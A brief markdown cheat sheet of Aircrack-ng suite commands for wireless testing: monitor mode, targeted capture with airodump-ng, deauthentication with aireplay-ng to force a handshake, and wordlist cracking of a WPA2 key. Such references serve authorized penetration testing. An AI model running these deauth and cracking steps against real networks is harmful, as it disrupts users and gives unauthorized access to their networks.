---
description: A quick wireless testing guide using wireless security Aircrack suite.
---

# Aircrack Suite

### Airmon-ng for monitor mode:

```text
airmon-ng
airodump-ng wlan0mon
```

### Airodump-ng to scan for BSSIDs:

```text
airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface]
airodump-ng -c 1 --bssid 80:2A:A8:C4:B2:39 -w /root/Desktop/ wlan0mon
```

### Aireplay-ng to replay packets:

```text
aireplay-ng -0 2 -a 80:2A:A8:C4:B2:39 -c 64:A2:F9:18:2F:28 wlan0mon
```

### Airecrack-ng to crack captured handshakes for PSKs:

```text
aircrack-ng -a2 -b 80:2A:A8:C4:B2:39 -w [path to wordlist] /root/Desktop/*.cap
```

